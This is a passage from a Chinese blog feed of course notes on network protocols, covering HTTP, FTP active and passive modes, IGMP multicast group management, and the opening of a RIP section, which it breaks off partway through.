        <content type="html"><![CDATA[<h2 id="超文本传输协议HTTP"><a href="#超文本传输协议HTTP" class="headerlink" title="超文本传输协议HTTP"></a>超文本传输协议HTTP</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握HTTP的报文格式</span><span class="token comment">#掌握HTTP的工作原理</span><span class="token comment">#掌握HTTP常用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="万维网体系结构"><a href="#万维网体系结构" class="headerlink" title="万维网体系结构"></a>万维网体系结构</h3><p>万维网，全称为World Wide Web，是一个由许多互相链接的超文本组成的系统，通过互联网访问。</p><ul><li>在这个系统中，每个有用的事物，称为“资源”，由全局“统一资源标识符(URL)”标识;这些资源通过超文本传输协议传送给用户，用户通过点击超链接来获得资源</li><li>每一个网站保存有一个或多个文档，叫做万维网页面。浏览器用来读取万维网上的文档<ul><li>客户需要查看网站A的某些信息，它向网站A发送一个请求，请求包含了网站A和其中万维网页面的地址，称为统一资源定位符(URL)</li><li>网站A收到请求后，将指定的文档发送给这个客户。</li></ul></li></ul><img src=".\HTTP协议\用户访问万维网示意图.png" style="zoom:67%;" /><center>用户访问万维网的示意图</center>> <p style="color:orange;">WWW服务是分布式的客户/服务器模式</p><p><strong>浏览器：</strong>客户端程序，可以解释和显示万维网页面。</p><p><strong>服务器：</strong></p><blockquote><ul><li>万维网页面存储在服务器上，当客户请求到达时，对应的页面就发送给客户</li><li>为了提高效率，服务器通常在其高速缓存中存放被请求过的页面</li><li>通过多线程或多进程可使服务器的效率更加提高，服务器在同一时间可回答多个请求</li></ul></blockquote><h4 id="统一资源定位符（URL"><a href="#统一资源定位符（URL" class="headerlink" title="统一资源定位符（URL)"></a>统一资源定位符（URL)</h4><blockquote><p style="color:orange;">Uniform Resource Locator，用于表示Internet上资源的位置和访问方法</p></blockquote><ul><li>URL由4部分组成:<ol><li><p><strong>协议</strong>:指定了用这个URL的客户/服务器程序。如，HTTP、FTP和TELNET等</p></li><li><p>主机:指明了信息所存放的地址，可以是逻辑地址也可以是相应的域名</p></li><li><p>端口:指定了使用主机的某个端口，端口是可选的。</p><blockquote><p style="color:blue;">如果包含了端口，那么端口就插入在主机和路径之间，和主机用冒号分隔开</p></blockquote></li><li><p>路径:指定了文件存放的位置。路径本身可以包含斜线，用于将目录与子目录和文件分隔开。</p></li></ol></li></ul><img src=".\HTTP协议\统一资源定位符.png" style="zoom:50%;" /><center>统一资源定位符格式:</center>##### 静态文档<p>内容固定的文档，由服务器创建。文档的内容是在创建文档时就确定的，而不是在使用它时。</p><h5 id="动态文档"><a href="#动态文档" class="headerlink" title="动态文档"></a>动态文档</h5><p>在浏览器请求该文档时才由万维网服务器创建出来。当请水到丛的，力维网服务器就运行创建动态文档的应用程序。服务器返回这个程序或脚本的输出，把它作为对请求该文档的浏览器的响应。<br>对每个请求都创建出新的文档，所以每个请求得到的动态文档内容可能不同。</p><h5 id="活动文档"><a href="#活动文档" class="headerlink" title="活动文档"></a>活动文档</h5><p>有些文档需要程序在客户端运行，称为活动文档。当浏览器请求活动文档时，服务器就发送这个文档的一个副本或脚本，然后这个文档就在客户（浏览器)端运行。</p><h3 id="HTTP报文格式："><a href="#HTTP报文格式：" class="headerlink" title="HTTP报文格式："></a>HTTP报文格式：</h3><p>超文本传输协议，Hyperlext Transfer Protocol，用于访问万维网上的数据</p><p>它是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。<br>协议以普通文本、超文本、音频、视频等格式传输数据，它可以快速的在文档之间跳转</p><ul><li><blockquote><p style="color:orange;">HTTP是一个应用层协议，它使用TCP连接进行可靠的传送，在熟知端口80上提供服务。</p></blockquote></li></ul><blockquote><p style="color:black;">HTTP报文有两种类型:请求报文和响应报文</p>- 两种报文格式只有开始行不同。</blockquote><ul><li><p> 首部行</p></li><li><p>用来说明浏览器、服务器或报文主体的一些信息。</p></li><li><p>由关键字/值对组成，每行一对，关键字和值用英文冒号“:”分隔，结束的地方都要有回车换行</p></li><li><p>首部可以有好几行，但也可以不使用。</p></li><li><p>整个首部行结束时，还要有一个空行将首部行和后面的实体主体分</p></li><li><p>实体主体</p><ul><li>在请求报文中一般不用，而在响应报文中也可能没有这个字段</li></ul></li></ul><h4 id="HTTP请求报文："><a href="#HTTP请求报文：" class="headerlink" title="HTTP请求报文："></a>HTTP请求报文：</h4><img src=".\HTTP协议\HTTP请求报文.png" style="zoom:67%;" /><ul><li><p>方法:</p><ul><li><p>常见的有GET和POST方法，在地址栏中输入网址访问网页时，浏览器采用GET方法向服务器获取资源，POST方法要求服务器接受附在请求后面的数据，常用于提交表单。</p><img src=".\HTTP协议\HTTP方法.png" style="zoom:67%;" /></li></ul></li><li><p>URL:向服务器请求的资源</p></li><li><p>HTTP版本:目前是http/1.1。</p></li><li><p>首部字段：</p><ul><li>Accept:指定客户端接受哪些类型的信息，如text/html,image/gif等</li><li>Accept-Language:指定一种自然语言。</li><li>Accept-Encoding:指定可接受的内容编码，如gzip, deflate。</li><li>User-Agent: 允许客户端将它的操作系统、浏览器和其它属性告诉服务器</li><li>Host:目标服务器</li><li>Connection:连接状态，如Keep-Alive，Close。</li></ul></li></ul><h4 id="HTTP回应报文"><a href="#HTTP回应报文" class="headerlink" title="HTTP回应报文"></a>HTTP回应报文</h4><img src=".\HTTP协议\HTTP回应报文.png" style="zoom:67%;" /><ul><li><p>版本:与请求报文相同</p></li><li><p>状态码:表示服务器的响应类型，有三位数字组成，其中第一个数字定义了响应的类别，有五种可能取值:</p><blockquote><ul><li>1xx:通知信息—表示请求已接收，继续处理</li><li>2xx:成功—表示请求已被成功接收、理解、接受</li><li>3xx:重定向一用于已经移动的文件</li><li>4xx:客户端错误—请求有语法错误或请求无法实现</li><li>5xx:服务器端错误—服务器失效无法完成请求</li></ul></blockquote></li></ul><img src=".\HTTP协议\HTTP协议状态码.png" style="zoom: 50%;" /><center>HTTP协议状态码：</center>- 短语:解释状态码的简单短语- 首部字段  - Date:消息产生时间  - Server:服务器用来处理请求的软件  - Set- cookie:设置Cookie及其路径  - Content-Length:实体正文的长度，十进制  - Connection:连接状态。  - Content-Type:发送给接收者的实体正文的媒体类型，如Content-Type:text/html;charset=GB2312。<h3 id="持久与非持久链接"><a href="#持久与非持久链接" class="headerlink" title="持久与非持久链接"></a>持久与非持久链接</h3><h4 id="非持久连接"><a href="#非持久连接" class="headerlink" title="非持久连接"></a>非持久连接</h4><ul><li>对每一个请求/响应都要建立一次TCP连接</li><li>非持久连接策略给服务器造成了很大的开销，因为服务器需要N个不同的缓存，而每次打开连接时都要使用慢开始过程</li><li>版本1.1以前的HTTP协议默认是非持久连接</li></ul><h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul><li><p>在使用持久连接时，服务器在发送响应后，让连接继续为一些请求打开</p></li><li><p>服务器可以在客户发送关闭请求时等待或关闭这个连接。</p></li><li><p>服务器可在相同的TCP连接上向客户发送多个对象</p><blockquote><p>HTTP版本1.1默认使用持久连接策略。</p></blockquote></li></ul><h3 id="万维网的工作过程："><a href="#万维网的工作过程：" class="headerlink" title="万维网的工作过程："></a>万维网的工作过程：</h3><p>每个万维网网点都有一个服务器,它不断地监听TCP的端口80，以便发现是否有浏览器（即万维网客户)向它发出连接建立请求。一旦监听到连接请求并建立了TCP连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后释放TCP连接。</p><img src=".\HTTP协议\万维网工作过程.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件传输协议FTP</title>
      <link href="/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/17/%E5%BA%94%E7%94%A8%E5%B1%82FTP%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="文件传输协议FTP"><a href="#文件传输协议FTP" class="headerlink" title="文件传输协议FTP"></a>文件传输协议FTP</h2><p>[TOC]</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#掌握FTP的工作原理#掌握FTP常用命令的使用方法及用途<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="TFP简介："><a href="#TFP简介：" class="headerlink" title="TFP简介："></a>TFP简介：</h3><p><strong>FTP (File Transfer Protocol）服务：</strong></p><p>FTP是TCP/IP网络上两台计算机之间传送文件的协议，它是在Internet上最早使用的协议之一。</p><blockquote><p style="color:blue;">FTP客户机可以给服务器发出命令来下载文件、上传文件、创建或改变服务器上的目录</p></blockquote><ul><li>原来的FTP软件多是命令行操作，有了像Filezilla这样的图形界面软件，使用FTP传输变得方便易学。</li><li>大多数FTP服务面向大众，不需要身份认证，即“匿名FTP服务器”。</li></ul><blockquote><p style="color:orange;">FTP协议是应用层的协议，它基于运输层，负责进行文件的传输</p></blockquote><ul><li>FTP是一个8位的客户端-服务器协议，能操作任何类型的文件而不需要进一步处理。</li><li>FTP服务<strong>一般运行在TCP的20和21两个端口</strong>。端口20用于在客户端和服务器之间<strong>传输数据流</strong>，而端口21用于<strong>传输控制流</strong>，并且是命令通向ftp服务器的入口</li></ul><h3 id="两种TCP连接"><a href="#两种TCP连接" class="headerlink" title="两种TCP连接"></a>两种TCP连接</h3><blockquote><p>控制连接:建立之后一直持续到客户和服务器间的通信完成为止，用于传送控制命令，服务器使用21号端口</p></blockquote><blockquote><p>数据连接:根据通信的需要随时建立和释放，用于数据传输，服务器通常使用20号端口</p></blockquote><h5 id="控制连接"><a href="#控制连接" class="headerlink" title="控制连接:"></a>控制连接:</h5><p>创建步骤:服务器在熟知端口21发出被动打开，等待客户，客户使用临时端口发出主动打开。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\创建TCP连接.png" style="zoom:67%;" /><h5 id="数据连接："><a href="#数据连接：" class="headerlink" title="数据连接："></a>数据连接：</h5><ul><li><strong>主动模式</strong>(PORT)由服务器端向客户端发起数据连接</li><li><strong>被动模式</strong>(PASV)由客户端向服务器端发起数据连接</li></ul><blockquote><p style="color:orange;">主动模式是服务器主动连接客户的数据端口，被动模式是服务器被动地等待客户连接自己的数据端口</p></blockquote><h4 id="主动模式下的FTP服务"><a href="#主动模式下的FTP服务" class="headerlink" title="主动模式下的FTP服务"></a>主动模式下的FTP服务</h4><p><strong>PORT(主动)模式的默认数据端口是20，控制端口是21</strong></p><ul><li><strong>连接过程</strong><ul><li>连接时，客户端使用随机的端口N(N&gt;1024)连接服务器的控制端口21建立控制连接</li><li>然后客户端开放N+1号端口进行监听，并通过控制连接向服务器发送命令PORT N+1</li><li>服务器用自己的数据端口20连接到客户端的N+1端口，建立数据连接。</li></ul></li></ul><h5 id="主动模式存在的问题："><a href="#主动模式存在的问题：" class="headerlink" title="主动模式存在的问题："></a>主动模式存在的问题：</h5><blockquote><p style="color:orange;">PORT(主动)模式发送端口给服务器，由服务器连回客户端</p></blockquote><ol><li>如果客户端有防火墙，这样的连接会被认为是外部主机试图连接内部的主机，通常情况下是不允许的</li><li>为了解决这个问题，引入了PASV（被动）模式。</li></ol><h4 id="被动模式下的FTP服务"><a href="#被动模式下的FTP服务" class="headerlink" title="被动模式下的FTP服务"></a>被动模式下的FTP服务</h4><ul><li><p>连接过程</p><ul><li>连接时，客户端使用一个随机的端口N(N&gt;1024)连接服务器的21端口建立控制连接</li><li>通过控制连接向服务器发送命令PASV (被动模式)。</li><li>服务器使用一个随机的数据端口M(M&gt;1024)并通过控制连接发回客户端</li><li>客户端用数据端口N+1连接服务器的端口M。</li></ul><p>由于是客户端主动发起数据连接，这样就解决了防火墙带来的问题。</p></li></ul><h3 id="FTP通信："><a href="#FTP通信：" class="headerlink" title="FTP通信："></a>FTP通信：</h3><p><strong>控制连接上的通信：</strong>FTP使用NVT ASCII字符集在控制连接上通信。通信过程使用命令和响应来完成，命令和响应都是一个短行，因此不必考虑它的文件结构。每一行以回车换行结束</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP控制链路上的通信.png" style="zoom:50%;" /><p><strong>数据连接上的通信：</strong>在传送数据之前，客户使用控制连接来做传输准备，定义文件类型、数据结构、传输方式</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP数据连接上的通信.png" style="zoom:50%;" /><h4 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h4><ol><li>ASCII文件:传送文本文件的默认格式。每一个字符使用NVT ASCII进行编码。发送端把文件从它自己的表示转换成NVT ASCII字符，而接收端从NVT ASCII字符转换成它自己的字符</li><li>EBCDIC文件:若连接的一端或两端使用EBCDIC编码，则可使用EBCDIC编码传送文件</li><li>图像文件:传送二进制文件的默认格式。这种文件是作为连续的比特流传送而没有任何解释或编码。在大多数情况下它用来传送二进制文件，如已编译的程序。</li></ol><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><ul><li>文件结构（默认)︰这种文件没有结构，它是连续的字节流</li><li>记录结构:这种文件划分为一些记录，这只能用于文本文件</li><li>页面结构:这种文件划分为一些页面，每一个页面有页面号和页面首部。页面可以随机地或顺序地进行存取</li></ul><h4 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h4><blockquote><p>流方式:这是默认方式。数据作为连续的字节流从FTP交付给TCP。TCP负责把数据划分为适当大小的报文。若数据是简单的字节流（文件结构），就不需要文件结束符。若数据划分为记录（记录结构)，则每一个记录有1字节的记录结束（EOR）字符，而在文件的结束处有文件结束（EOF）字符。</p></blockquote><blockquote><p>块方式:数据可以按块从FTP交付给TCP。每一个块的前面有3字节首部。第一个字节叫做块描述符，后两个字节定义块的大小，以字节为单位。</p></blockquote><blockquote><p>压缩方式:若文件很大，数据可进行压缩。通常使用的压缩方法是游程长度编码。数据单元的连续出现数可以用一个“出现”和“重复数”来替换。在文本文件中，这通常是空格。在二进制文件中，空字符常常被压缩。</p></blockquote><h4 id="文件传送"><a href="#文件传送" class="headerlink" title="文件传送"></a>文件传送</h4><blockquote><p>从服务器把文件复制到客户端叫做<strong>读取</strong>文件，使用RETR命令完成</p></blockquote><blockquote><p>从客户端把文件复制到服务器叫做<strong>存储</strong>文件，使用STOR命令完成。</p></blockquote><p>从服务器向客户端发送目录列表或文件名，使用LIST命令完成。FTP把目录或文件名列表当作文件，在数据连接上发送。</p><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP文件传送.png" style="zoom:67%;" /><h3 id="FTP响应与命令："><a href="#FTP响应与命令：" class="headerlink" title="FTP响应与命令："></a>FTP响应与命令：</h3><blockquote><p style="color:blue;">FTP使用控制连接在客户进程和服务器进程之间完成交互操作，客户端向服务器发送命令，服务器给客户返回响应</p></blockquote><h5 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h5><ul><li>命令形式是ASCII大写字符，后面的变量可以有，也可以没有。</li><li>命令可以粗略地划分为6组:接口命令、文件管理命令、数据格式化命端口定义命令、文件传送命令以及杂项命令。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP命令.png" style="zoom: 50%;" /><h5 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h5><blockquote><p style="color:blue;">每一个FTP命令都应该有响应。响应由两个部分组成:3个数字以及跟随在后面的文本。数字部分定义代码，文本部分定义所需的参数或额外的解释</p></blockquote><img src="D:\blog\shierjinghuang\source\_posts\应用层FTP协议\FTP相应.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Internet组管理协议IGMP</title>
      <link href="/2022/11/16/IGMP/"/>
      <url>/2022/11/16/IGMP/</url>
      
        <content type="html"><![CDATA[<h2 id="Internet组管理协议IGMP"><a href="#Internet组管理协议IGMP" class="headerlink" title="Internet组管理协议IGMP"></a>Internet组管理协议IGMP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 掌握IGMP协议的报文格式</span><span class="token comment"># 掌握IGMP协议的工作原理</span><span class="token comment"># 理解多播组地址到以太网地址的映射</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单播与多播与广播"><a href="#单播与多播与广播" class="headerlink" title="单播与多播与广播:"></a>单播与多播与广播:</h3><blockquote><p style="color:red;">单播(unicast):    单个源站与单个目的站之间的通信叫作单播，IP数据报中的源IP地址和目的IP地址分别代表了源站和目的站。</p></blockquote><blockquote><p style="color:blue;">绝大多数的网络应用程序是单播</p></blockquote><blockquote><p style="color:red;">多播/组播(multicast): 一个源站和多个目的站之间的通信叫作多播。</p></blockquote><blockquote><ul><li>IP数据报中的源地址是单播地址，目的地址是组地址(D类地址)</li><li>路由器收到组播数据包后，可从它的多个接口转发出去<br>目前，组播机制没有被广泛支持，主要的组播路由机制有距离向量多播路由协议(DVMRP)和协议无关组播(PIM) .</li></ul></blockquote><blockquote><p style="color:red;">广播(broadcast):广播源站和目的站是一对多的，源站只有一个，但所有其它主机都是目的站Internet不支持广播，因为这会产生非常大的通信量</p></blockquote><h4 id="组播"><a href="#组播" class="headerlink" title="组播:"></a>组播:</h4><p>优点：采用组播技术后，即使用户数量成倍增长，主干网带宽不需要随之增加。从而解决了宽带应用对带宽和服务质量的要求问题</p><img src=".\IGMP\组播示意.png" style="zoom: 33%;" /><p>组播比多个单播具有更小的分组时延</p><h5 id="组播地址范围："><a href="#组播地址范围：" class="headerlink" title="组播地址范围："></a>组播地址范围：</h5><blockquote><ol><li>IANA(国际因特网地址分配委员会）把D类地址空间用于IP组播地址</li><li>IP组播地址的范围是:224.0.0.0~239.255.255.255</li><li>常用的组播地址<ul><li>224.0.0.1        在本子网上的所有参加多播的主机和路由器</li><li>224.0.0.2        在本子网上的所有参加多播的路由器</li><li>224.0.0.5        用来给一个网段中所有的OSPF路由器发送OSPF路由信息</li><li>224.0.0.9        RIPv2组地址</li><li>224.0.0.11      供DHCP服务器和中继代理使用</li></ul></li></ol></blockquote><h5 id="动态的组成员"><a href="#动态的组成员" class="headerlink" title="动态的组成员"></a>动态的组成员</h5><blockquote><p style="color:orange;">多播组中的成员是动态的。一个进程可请求其主机参加某个特定组，或在任意时间退出该组</p></blockquote><h5 id="使用硬件进行多播"><a href="#使用硬件进行多播" class="headerlink" title="使用硬件进行多播"></a>使用硬件进行多播</h5><blockquote><p style="color:orange;">当数据报传送到以太网时，以太网利用硬件进行多播，交付给属于该组成员的主机</p></blockquote><h4 id="多播组地址到以太网地址的转换"><a href="#多播组地址到以太网地址的转换" class="headerlink" title="多播组地址到以太网地址的转换"></a>多播组地址到以太网地址的转换</h4><p>多播以太网地址的前25位是0000000100000000010111100这意味着与IP多播相对应的以太网地址范围从01005E000000到01005E7FFFFF。然后将多播IP地址的低23位映射到以太网地址中的低23位。</p><img src=".\IGMP\多播地址到以太网地址的转换.png" style="zoom: 50%;" /><p>由于D类地址的组标识字段长为28bit，将低23位复制到多播MAC地址中，有5bit未使用，所以<strong>映射是多对一的</strong>。</p><p><strong>32个多播IP地址映射到一个以太网多播地址</strong>。既然地址映射不是惟一的，那么设备驱动程序或lP层就必须对数据报进行过滤。因为网卡可能接收到主机不想接收的多播数据帧。另外，如果网卡不提供足够的多播数据帧过滤功能,设备驱动程序就必须接收所有多播数据帧，然后对它们进行过滤。</p><h3 id="IGMP协议简介："><a href="#IGMP协议简介：" class="headerlink" title="IGMP协议简介："></a>IGMP协议简介：</h3><p>IGMP ( lnternet Group Management Protocol)协议，IGMP位于网络层。</p><p style="color:orange;">IGMP协议运行于主机和主机直接相连的路由器之间，是IP主机用来报告多播组成员身份的协议</p>利用IGMP协议，一方面可以使主机通知本地路由器希望加入并接收某个特定多播组的信息;另一方面，路由器可以周期性地查询局域网内某个已知组的成员是否处于活动状态。IGMP使用预留的组播地址224.0.0.1与本地路由器通信。<h3 id="IGMP报文格式："><a href="#IGMP报文格式：" class="headerlink" title="IGMP报文格式："></a>IGMP报文格式：</h3><p>IGMP协议目前有三个版本IGMP、IGMPv2和IGMPv3。</p><p>其中IGMPv2有3种报文类型:</p><blockquote><p>查询报文:路由器查询多播组中是否有活跃成员，分为一般查询和特定查询</p><p>成员关系报告报文:加入多播组或响应查询报文。</p><p>退出报告报文:离开多播组。</p></blockquote><h4 id="IGMPv2报文格式："><a href="#IGMPv2报文格式：" class="headerlink" title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src=".\IGMP\IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src=".\IGMP\IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src=".\IGMP\加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src=".\IGMP\退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由信息协议RIP</title>
      <link href="/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src=".\路由信息协议\自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" 